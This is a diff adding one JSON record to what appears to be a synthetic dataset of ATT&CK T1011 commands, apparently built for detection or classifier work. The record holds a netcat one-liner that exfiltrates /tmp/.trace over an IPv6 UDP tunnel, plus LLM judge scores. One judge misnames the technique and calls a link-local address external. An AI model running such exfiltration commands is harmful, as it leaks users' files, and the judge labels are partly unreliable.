@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr gif0)\" \"fe80::8:dead:2%gif0\" 54329 < /tmp/.trace",
+  "explanation": "Transmits over the GIF tunnel interface (gif0) using IPv6 UDP with an uncommon port, explicitly leveraging a non-default tunnel medium consistent with T1011.",
+  "rationale_steps": [
+    "Use ipconfig to obtain the IPv6 address on gif0.",
+    "Bind the sender to force traffic through the GIF tunnel medium.",
+    "Exfiltrate via UDP to a link-local target using a rarely used port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-462c777a",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, valid BSD nc flags (-6, -u, -s), proper IPv6 scope-id usage, and correct input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It sends /tmp/.trace via IPv6 UDP to a link-local address scoped to gif0 using the interface’s IPv6 source, plausibly routing over the GIF tunnel, but relies on gif0 being properly configured and lacks broader automation features like scheduling.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2025-10-01T03:56:37.176290Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid netcat flags, and correct use of command substitution for the source IP address.",
+        "semantic_score": 5,
+        "semantic_justification": "The command aligns perfectly with T1011 (Automated Exfiltration) as it uses netcat to transfer data from a local file (/tmp/.trace) over a tunnel interface (gif0) using IPv6 UDP to an external destination, which is a common method for automated data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:54:26.299747Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags for netcat, and correct command substitution syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately demonstrates automated exfiltration by using `nc` to transmit data over a non-standard GIF tunnel interface with IPv6 UDP and an uncommon port, consistent with T1011's emphasis on alternative transfer methods.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:54:37.341217Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
